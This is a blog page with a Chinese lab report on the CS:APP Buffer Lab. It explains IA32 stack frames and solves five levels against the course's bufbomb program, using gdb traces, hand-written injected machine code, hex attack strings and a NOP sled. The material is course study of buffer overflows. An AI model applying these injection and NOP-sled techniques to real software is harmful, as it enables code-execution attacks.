
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="码龙的窝">
    <title>深入理解计算机系统BufferLab实验报告 - 码龙的窝</title>
    <meta name="author" content="码龙黑曜">
    
        <meta name="keywords" content="博客,iOS,Computer Science,码龙,">
    
    
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"码龙黑曜","sameAs":["https://github.com/BlackDragonF","https://t.me/Cosidian","http://steamcommunity.com/id/BlackDragonF/","mailto:obsidiandragon2016@gmail.com"],"image":"avatar.jpg"},"articleBody":"实验答案托管在我的Github上\n\nBuffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。\n\n实验简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。\n该实验加深了对于栈规则的理解以及说明了缓冲区溢出漏洞可能造成的危险后果。\n该实验同Attack Lab非常相似，但是仅仅采用了代码注入攻击作为攻击手段。同时，也要注意x86和x86_64有着不同的栈帧以及过程的调用方式。\nIA32的栈帧以及过程调用IA32的栈帧IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。\n调用者的栈帧主要包括了参数区以及返回地址。\n被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。\nIA32的过程调用IA32提供了如下的过程调用指令：\n\ncall 该指令将返回地址压入调用者的栈帧，并且将程序计数器%eip指向了被调用者的首地址\nleave 该指令一般位于ret指令之前，等价于mov %ebp,%esp和pop %ebp，主要作用是回收栈空间，并且恢复栈顶（%esp）和栈底（%ebp）使得栈帧恢复为调用者栈帧\nret 该指令从栈中弹出返回地址并且让程序计数器eip指向该地址，使程序继续执行被调用者的下一条指令\n\nIA32的过程调用遵循如下的规则：\n\n首先执行call指令，call会在调用者的栈顶压入返回地址并且使程序计数器指向被调用者\n然后保存调用者的栈底即push %ebp，并且将栈顶设置为被调用者的栈底即mov %esp,%ebp\n分配局部的栈空间，主要用于临时变量的存储\n执行被调用者的指令\n执行leave，释放栈空间并重置栈顶（%esp）和栈底（%ebp），使得恢复为调用者栈帧\n执行ret，过程返回并继续执行调用者的指令\n\nIA32的参数传递规则：同x86不同，IA32不使用寄存器进行参数的传递，IA32从右到左将参数依次压栈，然后调用相应的过程。\n实验准备实验讲义中主要包含了以下3个可执行文件：\n\nbufbomb 你所要攻击的缓冲区炸弹程序\nmakecookie 根据你所输入的userid生成一个cookie\nhex2raw 一个生成攻击字符串的工具\n\n首先我们要输入userid生成一个cookie供后续使用，命令及结果如下：123user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie BlackDragon &gt; cookie                          user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie                                              0x3dde924c\n然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：1user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d bufbomb &gt; bufbomb-disassemble\n目标程序目标程序的通过getbuf函数从标准输入流中读取字符串，并且该函数和Attack Lab中的函数一致，且具有缓冲区溢出的漏洞。这里不再赘述。\n值得注意的是，bufbomb函数接受如下的参数：\n\n-h 打印帮助信息\n-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关\n-n 进入’Nitro’模式，在阶段4中使用\n-s 将你的攻击字符串作为结果提交至计分服务器\n\n同Attack Lab一样，你需要使用hex2raw从攻击代码生成相应的攻击字符串，这里也不再赘述。\n实验过程阶段0：蜡烛（Candle）在本实验中，关键函数getbuf被test函数调用，getbuf和test函数如下：1234567891011121314151617181920212223242526272829/* getbuf */#define NORMAL_BUFFER_SIZE ??int getbuf()&#123;char buf[NORMAL_BUFFER_SIZE];Gets(buf);return 1;&#125;/* test */void test()&#123;int val;/* Put canary on stack to detect possible corruption */volatile int local = uniqueval();val = getbuf();/* Check for corrupted stack */if (local != uniqueval()) &#123;printf(\"Sabotaged!: the stack has been corrupted\\n\");&#125;else if (val == cookie) &#123;printf(\"Boom!: getbuf returned 0x%x\\n\", val);validate(3);&#125; else &#123;printf(\"Dud: getbuf returned 0x%x\\n\", val);&#125;&#125;\n现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：123456void smoke()&#123;printf(\"Smoke!: You called smoke()\\n\");validate(0);exit(0);&#125;\n首先我们需要确定缓冲区的大小，观察bufbomb-disassemble中getbuf的反汇编结果，如下：12345678910080491f4 &lt;getbuf&gt;: 80491f4:       55                      push   %ebp 80491f5:       89 e5                   mov    %esp,%ebp 80491f7:       83 ec 38                sub    $0x38,%esp 80491fa:       8d 45 d8                lea    -0x28(%ebp),%eax 80491fd:       89 04 24                mov    %eax,(%esp) 8049200:       e8 f5 fa ff ff          call   8048cfa &lt;Gets&gt; 8049205:       b8 01 00 00 00          mov    $0x1,%eax 804920a:       c9                      leave   804920b:       c3                      ret   \n注意到函数总共开辟了0x38=56个字节的栈空间，然后lea -0x28(%ebp),%eax mov %eax,(%esp)进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而ebp指向栈底，我们可以推测缓冲区总共是0x28=40个字节。\n经过实际测试，可以确定缓冲区确实是40个字节。\n下面我们观察反汇编代码，可以得出函数smoke的起始地址为0x08048c18，根据以上的信息，我们的攻击代码如下：12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 前40个字节 */00 00 00 00 18 8c 04 08 /* 保存的%ebp以及返回地址 */\n在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。\n下面我们使用hex2raw生成攻击字符串并测试。结果如下：1234567user@BlackDragon ~/C/B/buflab-handout&gt; cat level0.txt|./hex2raw|./bufbomb -u BlackDragon             Userid: BlackDragonCookie: 0x3dde924cType string:Smoke!: You called smoke()VALIDNICE JOB!run with level1\n阶段0完成。\n阶段1：火花（Sparkler）现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：123456789void fizz(int val)&#123;if (val == cookie) &#123;printf(\"Fizz!: You called fizz(0x%x)\\n\", val);validate(1);&#125; elseprintf(\"Misfire: You called fizz(0x%x)\\n\", val);exit(0);&#125;\n在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：1234567891011121314151617181920212208048c42 &lt;fizz&gt;: 8048c42:       55                      push   %ebp 8048c43:       89 e5                   mov    %esp,%ebp 8048c45:       83 ec 18                sub    $0x18,%esp 8048c48:       8b 45 08                mov    0x8(%ebp),%eax 8048c4b:       3b 05 08 d1 04 08       cmp    0x804d108,%eax 8048c51:       75 26                   jne    8048c79 &lt;fizz+0x37&gt; 8048c53:       89 44 24 08             mov    %eax,0x8(%esp) 8048c57:       c7 44 24 04 ee a4 04    movl   $0x804a4ee,0x4(%esp) 8048c5e:       08 8048c5f:       c7 04 24 01 00 00 00    movl   $0x1,(%esp) 8048c66:       e8 55 fd ff ff          call   80489c0 &lt;__printf_chk@plt&gt; 8048c6b:       c7 04 24 01 00 00 00    movl   $0x1,(%esp) 8048c72:       e8 04 07 00 00          call   804937b &lt;validate&gt; 8048c77:       eb 18                   jmp    8048c91 &lt;fizz+0x4f&gt; 8048c79:       89 44 24 08             mov    %eax,0x8(%esp) 8048c7d:       c7 44 24 04 40 a3 04    movl   $0x804a340,0x4(%esp) 8048c84:       08 8048c85:       c7 04 24 01 00 00 00    movl   $0x1,(%esp) 8048c8c:       e8 2f fd ff ff          call   80489c0 &lt;__printf_chk@plt&gt; 8048c91:       c7 04 24 00 00 00 00    movl   $0x0,(%esp) 8048c98:       e8 63 fc ff ff          call   8048900 &lt;exit@plt&gt;\n从上述反汇编代码的第1行第4行和第5行，我们可以知道函数fizz的起始地址为0x08048c42，val保存在0x8(%ebp)中，cookie保存在固定的地址0x804d108中。根据以上的信息，我们的攻击代码如下：123456700 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 前40个字节 */00 00 00 00 42 8c 04 08 /* 保存的%ebp以及返回地址 */00 00 00 00 4c 92 de 3d /* cookie */\n在该攻击代码中，前48个字节同阶段0一样，只是将返回地址改成了了函数fizz的起始地址。而最后8个字节则是用来伪装成传递参数的。注意函数从getbuf返回后并不会真正的调用fizz函数，而只是依次的开始执行fizz的指令。\n因此，从getbuf返回直到获取到参数val这整个过程中，首先getbuf返回会执行复位操作，将栈顶（%esp）指向第40个字节处（从0开始计算，下同），然后将0x0pop至栈底（%ebp），最后根据返回地址跳转至fizz并pop。现在栈顶（%esp）指向了第48个字节。紧接着，直接开始执行fizz的指令，将%ebp（0）入栈，直至执行到mov 0x8(%ebp),%eax，栈顶（%esp）指向第44个字节。所以，我们的cookie应当放在第(44+8=52）个字节处，直到第55个字节为止。\n下面我们使用hex2raw生成攻击字符串并测试，如下：123456user@BlackDragon ~/C/B/buflab-handout&gt; cat level1.txt|./hex2raw|./bufbomb -u BlackDragonUserid: BlackDragonCookie: 0x3dde924cType string:Fizz!: You called fizz(0x3dde924c)VALIDNICE JOB!\n阶段1完成。\n阶段2：爆竹（FireCracker）bufbomb中包含了一个全局变量global_value以及函数bang，如下：12345678910int global_value = 0;void bang(int val)&#123;if (global_value == cookie) &#123;printf(\"Bang!: You set global_value to 0x%x\\n\", global_value);validate(2);&#125; elseprintf(\"Misfire: global_value = 0x%x\\n\", global_value);exit(0);&#125;\n在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。\n该阶段同Attack Lab第1部分的等级2相似，我们需要将程序计数器%eip指向栈，在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang。\n首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：12345678910111213141516171819202122232425262728293031323334353637383940user@BlackDragon ~/C/B/buflab-handout&gt; gdb bufbomb                                           GNU gdb (GDB) 7.12.1Copyright (C) 2017 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-pc-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...Reading symbols from bufbomb...(no debugging symbols found)...done.(gdb) break getbufBreakpoint 1 at 0x80491fa(gdb) run -u BlackDragonStarting program: /home/user/CSAPPLabs/BufferLab/buflab-handout/bufbomb -u BlackDragonUserid: BlackDragonCookie: 0x3dde924cBreakpoint 1, 0x080491fa in getbuf ()(gdb) disasDump of assembler code for function getbuf:   0x080491f4 &lt;+0&gt;:\tpush   %ebp   0x080491f5 &lt;+1&gt;:\tmov    %esp,%ebp   0x080491f7 &lt;+3&gt;:\tsub    $0x38,%esp=&gt; 0x080491fa &lt;+6&gt;:\tlea    -0x28(%ebp),%eax   0x080491fd &lt;+9&gt;:\tmov    %eax,(%esp)   0x08049200 &lt;+12&gt;:\tcall   0x8048cfa &lt;Gets&gt;   0x08049205 &lt;+17&gt;:\tmov    $0x1,%eax   0x0804920a &lt;+22&gt;:\tleave     0x0804920b &lt;+23&gt;:\tret    End of assembler dump.(gdb) print /x $esp$1 = 0x55682f18(gdb) print /x $ebp$2 = 0x55682f50\n通过在gdb中添加断点并观察，我们可以确定在执行函数getbuf时，栈底（%ebp）的值为0x55682f50。\n接下来我们要通过gcc和objdump生成攻击代码，具体的操作和Attack Lab相似，我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，如下：1234mov $0x3dde924c, %eaxmov %eax, 0x804d100 ;设置全局变量add $16, %esp ;修改栈顶ret ;返回\n然后我们依次使用gcc -m32 -c level2-exploit.s和objdump -d level2-exploit.o &gt; level2-exploit.d将攻击代码汇编和反汇编，具体的命令和结果如下：1234567891011121314user@BlackDragon ~/C/B/buflab-handout&gt; gcc -m32 -c level2-exploit.s                          user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d level2-exploit.o &gt; level2-exploit.duser@BlackDragon ~/C/B/buflab-handout&gt; cat level2-exploit.d                                    level2-exploit.o：     文件格式 elf32-i386Disassembly of section .text:00000000 &lt;.text&gt;:   0:\tb8 4c 92 de 3d       \tmov    $0x3dde924c,%eax   5:\ta3 00 d1 04 08       \tmov    %eax,0x804d100   a:\t83 c4 10             \tadd    $0x10,%esp   d:\tc3                   \tret     　\n最后我们根据以上的信息来生成我们最终的攻击代码，如下:12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 前40个字节 */00 00 00 00 58 2f 68 55 /* 保存的%ebp以及返回地址(在栈上) */b8 4c 92 de 3d a3 00 d104 08 83 c4 10 c3 00 00 /* 攻击代码 */9d 8c 04 08　           /* 返回地址指向函数bang */\n下面我们使用hex2raw生成攻击字符串并测试，结果如下：123456user@BlackDragon ~/C/B/buflab-handout&gt; cat level2.txt|./hex2raw|./bufbomb -u BlackDragonUserid: BlackDragonCookie: 0x3dde924cType string:Bang!: You set global_value to 0x3dde924cVALIDNICE JOB!\n阶段2完成。\n阶段3：炸药（Dynamite）在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。\n在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着你必须：\n\n在栈上执行机器代码\n将返回指针置于代码的起始\n修复对栈造成的破坏\n\n具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。\n对于该阶段，我们的思路如下：\n\n缓冲区溢出的部分要保证保存的%ebp不变以方便后续的寻址过程（攻击代码中使用）。然后和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码\n攻击代码首先将返回地址设置为正确的返回地址（调用者的下一条指令）\n然后再将返回值（%eax）设置为cookie\n最终修改栈顶（%esp）并ret\n\n缓冲区溢出攻击后，我们期望的整个程序的执行过程如下：\n\n跳转至栈上执行代码，此时%esp被修改至第48个字节处，且%ebp中存有正确的值。\n程序执行攻击代码，该攻击代码重置了返回地址，覆盖了getbuf的返回值，修改了栈顶指针并ret\n程序带着完整的栈状态和修改后的返回值返回至test函数，并继续执行\n\n下面我们讨论一下攻击代码中具体的细节。\n首先是保存的ebp的值到底是多少，这个我们可以在gdb中直接调试打印得出，为0x55682f80。栈上的返回地址和阶段2一样，为0x55682f58。\n然后我们的攻击代码如下：12345mov $0x8048dbe, %eax ;将真正的返回地址送入%eaxmov %eax, -0x2c(%ebp) ;将%eax送入栈上的正确位置mov $0x3dde924c, %eax ;修改返回值sub $4, %esp ;修改栈顶%espret\n这里讨论一下为什么是-0x2c(%ebp)，保存的%ebp是调用者的栈底，我们观察调用者函数test的反汇编代码，如下：123456789101112131415161718192021222324252627282930313233343508048daa &lt;test&gt;: 8048daa:       55                      push   %ebp 8048dab:       89 e5                   mov    %esp,%ebp 8048dad:       53                      push   %ebx 8048dae:       83 ec 24                sub    $0x24,%esp 8048db1:       e8 da ff ff ff          call   8048d90 &lt;uniqueval&gt; 8048db6:       89 45 f4                mov    %eax,-0xc(%ebp) 8048db9:       e8 36 04 00 00          call   80491f4 &lt;getbuf&gt; 8048dbe:       89 c3                   mov    %eax,%ebx 8048dc0:       e8 cb ff ff ff          call   8048d90 &lt;uniqueval&gt; 8048dc5:       8b 55 f4                mov    -0xc(%ebp),%edx 8048dc8:       39 d0                   cmp    %edx,%eax 8048dca:       74 0e                   je     8048dda &lt;test+0x30&gt; 8048dcc:       c7 04 24 88 a3 04 08    movl   $0x804a388,(%esp) 8048dd3:       e8 e8 fa ff ff          call   80488c0 &lt;puts@plt&gt; 8048dd8:       eb 46                   jmp    8048e20 &lt;test+0x76&gt; 8048dda:       3b 1d 08 d1 04 08       cmp    0x804d108,%ebx 8048de0:       75 26                   jne    8048e08 &lt;test+0x5e&gt; 8048de2:       89 5c 24 08             mov    %ebx,0x8(%esp) 8048de6:       c7 44 24 04 2a a5 04    movl   $0x804a52a,0x4(%esp) 8048ded:       08 8048dee:       c7 04 24 01 00 00 00    movl   $0x1,(%esp) 8048df5:       e8 c6 fb ff ff          call   80489c0 &lt;__printf_chk@plt&gt; 8048dfa:       c7 04 24 03 00 00 00    movl   $0x3,(%esp) 8048e01:       e8 75 05 00 00          call   804937b &lt;validate&gt; 8048e06:       eb 18                   jmp    8048e20 &lt;test+0x76&gt; 8048e08:       89 5c 24 08             mov    %ebx,0x8(%esp) 8048e0c:       c7 44 24 04 47 a5 04    movl   $0x804a547,0x4(%esp) 8048e13:       08 8048e14:       c7 04 24 01 00 00 00    movl   $0x1,(%esp) 8048e1b:       e8 a0 fb ff ff          call   80489c0 &lt;__printf_chk@plt&gt; 8048e20:       83 c4 24                add    $0x24,%esp 8048e23:       5b                      pop    %ebx 8048e24:       5d                      pop    %ebp 8048e25:       c3                      ret    \n我们可以知道函数test在栈上分配了0x24=36个字节的空间，而在这之前栈上还有被push的%ebx占4个字节，那么如果要想要定位到调用者栈顶的返回地址，偏移量应为36+4+4=44=0x2c，考虑到栈自高地址向低地址增长，所以应为-0x2c(%ebp)。\n而程序从getbuf返回时栈顶指针并没有指向我们设置的返回地址，而是指向了栈上紧邻着该地址的高地址位置，所以我们需要将%esp-4以确保其指向了我们设置的返回地址，使得程序能正确返回。\n下面我们使用gcc和objdump生成攻击代码，并且我们最终的攻击代码如下：12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 前40个字节 */80 2f 68 55 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上） */b8 be 8d 04 08 89 45 d4 /* 攻击代码 */b8 4c 92 de 3d 83 ec 04c3\n最后我们使用hex2raw生成攻击字符串并测试，结果如下：123456user@BlackDragon ~/C/B/buflab-handout&gt; cat level3.txt|./hex2raw|./bufbomb -u BlackDragon         Userid: BlackDragonCookie: 0x3dde924cType string:Boom!: getbuf returned 0x3dde924cVALIDNICE JOB!\n阶段3完成。\n攻击代码的优化注意到在上面我们的攻击代码还是很麻烦的，我们不仅花了很大的时间保证被保存的%ebp不变，还调整了栈顶指针使得函数能正确返回。\n其实，我们可以使用push returnAddress，ret来达到返回到指定位置的效果。也能直接在攻击代码中设置%ebp的值，这样，我们的攻击代码如下：1234mov $0x3dde924c,%eax ;返回值mov $0x55682f80,%ebp ;修改%ebppush $0x8048dbe ;将返回地址压栈ret\n根据以上的信息重新生成我们的攻击代码：1234567800 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 /* 前40个字节 */00 00 00 00 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上）*/b8 4c 92 de 3d bd 80 2f /* 攻击代码 */68 55 68 be 8d 04 08 c3\n使用hex2raw生成攻击字符串并测试，结果如下：123456user@BlackDragon ~/C/B/buflab-handout&gt; cat level3-2.txt|./hex2raw|./bufbomb -u BlackDragon          Userid: BlackDragonCookie: 0x3dde924cType string:Boom!: getbuf returned 0x3dde924cVALIDNICE JOB!\n阶段4：硝化甘油（Nitroglycerin）\n需要为bufbomb以及hex2raw添加命令行参数’-n’以执行本阶段\n\n本阶段非常的具有挑战性，在本阶段中，函数getbuf的栈帧的位置在每次运行时都是不同的。栈随机化的策略明显提升了攻击的难度。\n具体来说，在该阶段中，程序会调用getbufn来从标准输入流中读取数据，和getbuf不同的是，getbufn具有512个字节的缓冲区，并且，在相邻两次getbufn的调用中，%ebp的值将会出现最多+-240的误差。除此以外，在该阶段中，程序总共会使用5次你所输入的字符串，也就是说，总共会调用5次getbufn。同阶段3的任务相似，你必须保证每一次调用getbufn，其返回值均为cookie。\n若返回值为cookie，则程序会输出”KABOOM!”。你的攻击代码需要在5次栈帧位置不同的函数getbuf的调用中设置cookie为返回值，恢复对栈造成的破坏，设置正确的返回地址，并最终执行ret执行以返回testn。\n在本阶段中我们需要使用一种名为nop雪橇（nop sled）的攻击方式来对抗随机化。具体来说，就是通过在攻击代码前大量插入nop（空操作，编码为90）。这样，就算栈的起始地址在一定范围内波动，只要程序能跳转至其中一个nop指令，就能顺着这一组nop指令滑向我们真正的攻击代码。\n首先我们需要考虑的是我们攻击代码的长度，由于必须要通过缓冲区溢出覆盖掉函数getbufn的返回地址，所以攻击代码的长度至少为520个字节的缓冲区，4个字节的被保存的%ebp，以及4个字节的返回地址。\n我们将攻击代码放在缓冲区的最后，并且用90（nop）填充所有未被利用到的缓冲区以实现一个nop sled。\n具体的攻击代码如下：1234lea 0x28(%esp), %ebp ;复原%ebpmov $0x3dde924c, %eax ;设置cookiepush $0x8048e3a ;将返回地址压栈ret\n注意到我们无法再采用阶段3中的办法来复原%ebp了。但是注意到，当函数从getbufn返回时，%esp的值是正确的，而%esp和%ebp的相对差值是固定的，因此我们可以根据函数返回时的%esp去还原%ebp，对于testn来说，%esp和%ebp之间相差了36+4=40=0x28个字节。\n最后是返回地址的设定，在gdb中观察可知第一次执行时buf的地址为0x55682f40，因此我们将返回地址设置为0x55682f40-480=0x55682d60可保证每次都能命中。\n最终我们的攻击代码如下：12345678910111213141516171819202122232425262728293031323390 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* nop sled */90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 2428 b8 4c 92 de 3d 68 3a 8e 04 08 c3 60 2d 68 55 /* 攻击代码与返回地址 */\n使用hex2raw生成攻击字符串并测试，结果如下：1234567891011121314user@BlackDragon ~/C/B/buflab-handout&gt; cat level4.txt|./hex2raw -n|./bufbomb -u BlackDragon -n  Userid: BlackDragonCookie: 0x3dde924cType string:KABOOM!: getbufn returned 0x3dde924cKeep goingType string:KABOOM!: getbufn returned 0x3dde924cKeep goingType string:KABOOM!: getbufn returned 0x3dde924cKeep goingType string:KABOOM!: getbufn returned 0x3dde924cKeep goingType string:KABOOM!: getbufn returned 0x3dde924cVALIDNICE JOB!\n阶段4完成。\n实验总结Buffer Lab整体上同Attack Lab的第1部分，代码注入攻击相似，不同在于需要了解IA32的栈帧结构，过程调用以及参数传递的原理。\n除此以外，还需要了解对抗栈随机化的一种攻击方式 - nop sled。\n","dateCreated":"2017-05-16T14:28:12+08:00","dateModified":"2018-05-15T17:16:08+08:00","datePublished":"2017-05-16T14:28:12+08:00","description":"","headline":"深入理解计算机系统BufferLab实验报告","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/"},"publisher":{"@type":"Organization","name":"码龙黑曜","sameAs":["https://github.com/BlackDragonF","https://t.me/Cosidian","http://steamcommunity.com/id/BlackDragonF/","mailto:obsidiandragon2016@gmail.com"],"image":"avatar.jpg","logo":{"@type":"ImageObject","url":"avatar.jpg"}},"url":"http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/","keywords":"实验, 计算机系统"}</script>
    <meta name="description" content="实验答案托管在我的Github上  Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。  实验简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时">
<meta name="keywords" content="实验,计算机系统">
<meta property="og:type" content="blog">
<meta property="og:title" content="深入理解计算机系统BufferLab实验报告">
<meta property="og:url" content="http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/index.html">
<meta property="og:site_name" content="码龙的窝">
<meta property="og:description" content="实验答案托管在我的Github上  Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。  实验简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时">
<meta property="og:locale" content="zh-cn">
<meta property="og:updated_time" content="2018-05-15T09:16:08.587Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="深入理解计算机系统BufferLab实验报告">
<meta name="twitter:description" content="实验答案托管在我的Github上  Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。  实验简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时">
    
    
        
    
    
        <meta property="og:image" content="http://blog.codedragon.tech/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-j4w0tbtf1olriqsnfyv4egntpbdblucqpyraoqqnvawa2vd6l4m8ljtn2yes.min.css">
    <!--STYLES END-->
    
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-108458894-1', 'auto');
        ga('send', 'pageview');
    </script>


    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="4">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">码龙的窝</a>
    </div>
    
        
            <a  class="header-right-picture "
                href="#about">
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="4">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
                </a>
                <h4 class="sidebar-profile-name">码龙黑曜</h4>
                
                    <h5 class="sidebar-profile-bio"><p>iOS开发者/计算机科学/兽人控</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                            title="首页"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-categories"
                            
                            title="分类"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
